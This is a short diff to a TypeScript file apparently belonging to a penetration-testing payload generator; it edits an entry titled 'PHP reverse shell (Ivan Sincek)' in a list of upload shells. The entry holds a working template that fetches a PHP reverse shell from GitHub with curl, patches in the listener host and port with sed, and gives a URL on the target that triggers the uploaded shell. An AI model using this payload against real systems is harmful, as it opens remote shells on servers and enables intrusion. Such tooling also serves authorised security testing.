@@ -65,7 +65,7 @@ export const UPLOAD_SHELLS: PayloadDef[] = [
   },
   {
     id: "upload-php-ivan-sincek", generator: "shell", title: "PHP reverse shell (Ivan Sincek)", os: "any",
-    contexts: ["uploaded-file"], requires: ["php", "curl"], listeners: REVERSE, bakesIp: true,
+    contexts: ["uploaded-file"], requires: ["php"], listeners: REVERSE, bakesIp: true,
     template: `curl -so {FILE} https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php && sed -i "s/new Shell([^)]*)/new Shell('{LHOST}', {LPORT})/" {FILE}`,
     defaults: { FILE: "rev.php" }, upload: { trigger: "http://{TARGET_IP}/{UPLOAD_PATH}/{FILE}", kali: true },
     parts: [
